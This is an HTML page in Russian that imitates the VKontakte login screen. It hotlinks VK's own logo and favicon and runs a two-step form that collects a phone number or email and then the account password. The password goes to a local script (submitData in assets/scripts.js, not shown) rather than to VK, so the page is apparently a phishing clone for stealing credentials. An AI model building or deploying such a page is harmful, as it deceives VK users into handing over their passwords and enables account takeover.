<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход ВКонтакте</title>
    <link rel="icon" type="image/png" sizes="32x32" href="https://static.vk.com/vkid/1.1.947/favicon-new-32x32.png?1">
    <link rel="stylesheet" href="assets/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
    <div class="container active" id="login-step1">
        <img src="https://static.vk.com/vkid/1.1.947/favicon-new-192x192.png?1" alt="VK Logo">
        <h2>Вход ВКонтакте</h2>
        <p class="description">Введите телефон или почту, которые привязаны к аккаунту</p>
        <form onsubmit="showPasswordStep(event)">
            <input type="text" id="user-input" placeholder="Телефон или почта" required>
            <label>
                <input type="checkbox" checked> Сохранить вход
            </label>
            <button type="submit">Продолжить</button>
        </form>
        <p>Нажимая «Продолжить», вы принимаете пользовательское соглашение и политику конфиденциальности</p>
    </div>

    <div class="container" id="login-step2">
        <img src="https://static.vk.com/vkid/1.1.947/favicon-new-192x192.png?1" alt="VK Logo">
        <h2>Введите пароль</h2>
        <p class="description">Введите ваш текущий пароль, привязанный к <span id="user-number"></span></p>
        <form onsubmit="submitData(event)">
            <input type="password" id="password" placeholder="Введите пароль" required>
            <a href="#" class="forgot-password">Забыли или не установили пароль?</a>
            <button type="submit">Продолжить</button>
        </form>
    </div>

    <script src="assets/scripts.js"></script>
</body>
</html>
